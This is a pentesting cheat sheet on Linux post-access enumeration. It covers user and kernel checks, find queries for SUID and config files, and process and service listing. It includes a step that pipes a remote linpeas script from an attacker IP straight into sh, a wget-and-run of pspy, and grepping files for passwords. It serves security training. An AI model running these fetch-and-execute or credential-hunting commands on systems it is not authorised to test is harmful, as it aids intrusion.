# Linux Enumeration

## Check who you are

```bash
┌──(mac㉿kali)-[~]
└─$ whoami
mac
```

or alternatively use `id` to see more information about your `uid` and which groups you are in:

```bash
┌──(mac㉿kali)-[~]
└─$ id
uid=1000(mac) gid=1000(mac) groups=1000(mac),27(sudo)
```

## Check for other people
Read the `/etc/passwd` file to see a list of users on the box:

```bash
$ cat /etc/passwd
```

Many of these users will relate to certain services, and not be a real person. Look for real users by filtering by those with a real login shell:

```bash
$ cat /etc/passwd | grep sh
root:x:0:0:root:/root:/bin/bash
mac:x:1000:1000:Mac,,,:/home/mac:/bin/bash
```

## Check kernel information

```bash
┌──(mac㉿kali)-[~]
└─$ uname -a
Linux kali 5.10.0-kali5-amd64 #1 SMP Debian 5.10.24-1kali1 (2021-03-23) x86_64 GNU/Linux
```

**What does this mean?**

The kernel is a central part of the operating system. This command tells you about the distribution (Kali Linux), the version, and the word size (`x86_64`, i.e. 64-bit)

## Reading all Files
This command concatenates the contents of any readable files in the current working directory:

```bash
$ cat */*
```

It can be combined with a `grep` to look for passwords, for example:

```bash
$ cat */* | grep pass
```

However, it is not particularly efficient on a large number of files - try to use it within a specific directory

## Find Command

Find files by user ownership (from [this post](https://unix.stackexchange.com/questions/22747/finding-files-by-their-owner-and-file-permissions))

```bash
$ find / -user userX
```

Find files by group ownership (from [this post](https://unix.stackexchange.com/questions/159244/find-files-belonging-to-a-group))

```bash
$ find / -group groupX
```
  
Find config files and redirect errors:

```bash
$ find / -name '*.conf' 2>/dev/null
```

Find suid files:

```bash
$ find . -perm /4000
```

Exclude a filename or other query with the `-not` or `!` operator:

```bash
$ find . -not -name "*.exe"

#exclude directories and files beginning with "sys"
$ find /var ! -name "sys*" ! -type d
```

As always, filter your output with `grep` if your find command is not granular enough:

```bash
# anything with "backup" in the name
$ find / -type f | grep backup

#get rid of stuff from /proc and /var/lib
$ find / -user user | grep -v 'proc\|var/lib'

#get rid of error messages (useful if the > operator doesn't work in a shell)
$ find / -user user | grep -v 'Permission denied'
```

You can even use regex in your `find` command with the `-regex` flag:

```bash
$ find ./ ! -regex  '.*\(deb\|vmdk\)$'
```

Or use logical operators like `-o` (logical OR):
```bash
$ find /media/d/ -type f -size +50M ! \( -name "*deb" -o -name "*vmdk" \)
```

(both of the above examples from https://unix.stackexchange.com/questions/50612/how-to-combine-2-name-conditions-in-find#)

## Linpeas
Install Linpeas from [GitHub](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

--

**IMPORTANT UPDATE:** on 22/04/21 @\_superhero1 on twitter revealed they [failed OSCP](https://twitter.com/_superhero1/status/1385206684109447168) because of a linpeas auto exploit regarding sudo tokens. They were eventually awarded the revoked points, but OffSec made it clear they would not be lenient in future. The offending auto exploit feature [was removed](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/issues/125), but you must make sure you use the [fixed version](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/commit/14601ecd35585537f0fe0041e411ecff0fcd27a8) of LinPeas, which has been [confirmed](https://www.offensive-security.com/offsec/understanding-pentest-tools-scripts/) by OffSec to be exam safe.

--

Placing `linpeas.sh` in `~/Documents/enum` allows you to easily retrieve it with a simple python server. See [[Aliases#Useful Aliases|Useful Aliases]] for `enumserve` alias setup instructions.

On attacker machine:

```bash
$ enumserve
```

Find your IP address ([[Linux Networking#Get your IP]])

On target machine:

```bash
$ wget [IP]:8000/linpeas.sh
$ chmod +x linpeas.sh
$ ./linpeas.sh
```

You can also send it directly to `sh`/`bash` if `wget` is not installed:

```bash
$ curl 10.10.14.53:8000/linpeas.sh | sh
```

Sometimes firewall rules may prevent you from accessing port 8000 - try running the server on port 80 if you aren't getting any results (requires root permissions):

```bash
$ sudo python3 -m http.server 80
```

## Standard Directories to Check
```
/home
/var/www
/var/backups
/var/logs
/opt
/usr/share
/usr/share/local
```

## List Processes & Services
List processes:

```bash
$ ps aux
```

Pspy monitoring:

```bash
$ wget [IP]:8000/pspy64
$ chmod +x pspy64
$ ./pspy64
```

List services:

```bash
$ netstat
```

```bash
$ ss -lntp
```

```bash
$ systemctl list-units --type=service --state=running
```

**Why is this useful?**

- It allows you to see what might be running on a system - and therefore what might be a vulnerable process or service
- It gives you clues to the purpose/role of the user or the system
- It may help you identify processes that belong to higher-privileged users

# Tags

#cheat-sheet #enum #unix 